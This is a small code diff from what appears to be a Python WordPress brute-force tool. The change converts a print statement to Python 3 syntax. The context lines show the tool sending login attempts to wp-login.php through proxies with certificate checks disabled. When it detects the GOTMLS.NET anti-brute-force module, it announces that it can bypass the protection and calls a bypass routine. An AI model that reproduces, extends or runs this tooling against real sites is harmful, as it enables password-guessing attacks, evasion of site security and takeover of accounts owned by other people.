@@ -60,7 +60,7 @@ class WPBrute:
                 cpost = c.post(url + '/wp-login.php', data=payload, cookies=cookies, allow_redirects=True, verify=False, proxies=proxy)
 
             if "brute-force attacks" in cpost.text:
-                print "[!]  This site is protected by GOTMLS.NET Brute-Force Module. That is OK. I can bypass this protection..."
+                print("[!]  This site is protected by GOTMLS.NET Brute-Force Module. That is OK. I can bypass this protection...")
                 self.GOTMLSbypass(username, password, payload, url, cookies, proxies)
             else:
                 check = re.search("ERROR", cpost.text)
